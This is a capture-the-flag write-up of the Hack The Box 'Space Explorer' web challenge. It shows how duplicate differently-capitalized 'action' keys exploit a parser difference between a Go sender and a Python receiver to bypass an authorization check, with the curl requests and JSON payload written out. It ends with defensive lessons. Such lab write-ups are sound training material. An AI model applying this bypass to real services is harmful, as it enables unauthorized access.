# Hack The Box — Space Explorer

## Challenge Overview

**Challenge:** Space Explorer
**Category:** Web / Authentication
**Difficulty:** Easy

### Scenario

A lost space mission control system suffers from flawed authentication logic between its **Sender** and **Receiver** services.

The web application exposes a **COSMIC SCANNER** interface with two main actions:

* `Scan Cosmic Anomaly`
* `ACCESS SECURE DATABASE`

The objective is to access the secure database and retrieve the flag.

---

# 1. Reconnaissance

The target application is available at:

```text
http://<TARGET>:<PORT>/
```

Opening the website displays:

```text
COSMIC SCANNER

[ Scan Cosmic Anomaly ]

[ ACCESS SECURE DATABASE ]
```

Using the browser's Developer Tools or Burp Suite, we can inspect the requests generated by the application.

---

# 2. Discovering the `/execute` Endpoint

Clicking **Scan Cosmic Anomaly** generates a request similar to:

```http
POST /execute HTTP/1.1
Host: <TARGET>:<PORT>
Content-Type: application/json

{"action":"getcosmic"}
```

We can reproduce the request manually with `curl`:

```bash
curl -i http://<TARGET>:<PORT>/execute \
  -H 'Content-Type: application/json' \
  --data '{"action":"getcosmic"}'
```

The server responds with information about a cosmic anomaly:

```json
{
  "name": "Quantum Singularity",
  "src": "https://..."
}
```

This confirms that `/execute` is the main API endpoint.

---

# 3. Testing the Secure Action

We can try calling the secure action directly:

```bash
curl -i http://<TARGET>:<PORT>/execute \
  -H 'Content-Type: application/json' \
  --data '{"action":"getSecureCode"}'
```

The response is:

```text
Access denied: Invalid security clearance
```

Therefore, the externally accessible Sender service does not normally allow `getSecureCode`.

---

# 4. Understanding the Sender and Receiver

The challenge consists of two services:

```text
             HTTP Request
                  |
                  v
        +-------------------+
        |   Go Sender       |
        |   Port 8080       |
        +---------+---------+
                  |
                  | Internal request
                  v
        +-------------------+
        | Python Receiver   |
        |   Port 8081       |
        +-------------------+
```

The important part is that the two services parse JSON differently.

---

# 5. Sender — Go JSON Parsing

The Go application uses a structure similar to:

```go
type RequestData struct {
    Action string `json:"action"`
}
```

The Sender then checks the value of `Action`.

For example:

```text
getcosmic
```

is allowed, while:

```text
getSecureCode
```

is rejected.

The important behavior is that Go's JSON decoder matches JSON field names without requiring the same capitalization.

Therefore:

```json
{
    "action": "getcosmic"
}
```

and:

```json
{
    "Action": "getcosmic"
}
```

can both populate the Go `Action` field.

---

# 6. Receiver — Python JSON Parsing

The Receiver processes the JSON as a Python dictionary.

It accesses the action using:

```python
data['action']
```

Python dictionary keys are case-sensitive.

Therefore these are different keys:

```text
action
Action
ACTION
```

For example:

```json
{
    "action": "getSecureCode",
    "Action": "getcosmic"
}
```

is interpreted by Python as:

```text
action  = getSecureCode
Action  = getcosmic
```

---

# 7. Exploiting the Parser Differential

We can exploit the difference between the two JSON parsers.

Our goal is to make:

```text
Go Sender     → see getcosmic
Python        → see getSecureCode
```

We can accomplish this using two differently capitalized keys:

```json
{
    "action": "getSecureCode",
    "Action": "getcosmic"
}
```

---

# 8. What the Go Sender Sees

Because Go performs case-insensitive JSON field matching, the two keys correspond to the same Go structure field:

```go
Action
```

The second value is:

```text
getcosmic
```

Therefore the Sender effectively sees:

```text
Action = getcosmic
```

The Sender allows the request.

However, the original JSON body is forwarded to the Receiver.

---

# 9. What the Python Receiver Sees

Python keeps the keys separate:

```text
action  → getSecureCode
Action  → getcosmic
```

The Receiver checks:

```python
data['action']
```

Therefore it sees:

```text
getSecureCode
```

The secure database functionality is consequently executed.

# 14. Vulnerability

The vulnerability is caused by **inconsistent JSON parsing between the Sender and Receiver**.

The Sender and Receiver make different assumptions about JSON key capitalization:

| Service         | JSON handling                   |
| --------------- | ------------------------------- |
| Go Sender       | Case-insensitive field matching |
| Python Receiver | Case-sensitive dictionary keys  |

Because the Sender validates one interpretation of the request while the Receiver executes another interpretation, an attacker can bypass the Sender's authorization check.

This type of vulnerability can be described as a:

```text
JSON Parser Differential
```

or:

```text
Inconsistent Input Parsing
```

---

# 15. Key Takeaway

The important lesson from this challenge is:

> Never rely on one service's interpretation of user-controlled input when forwarding that input to another service.

When multiple services process the same request, they must use consistent parsing and validation rules.

Authorization should also be enforced by the service that performs the privileged operation—the Receiver should not blindly trust that the Sender has already authorized the request.
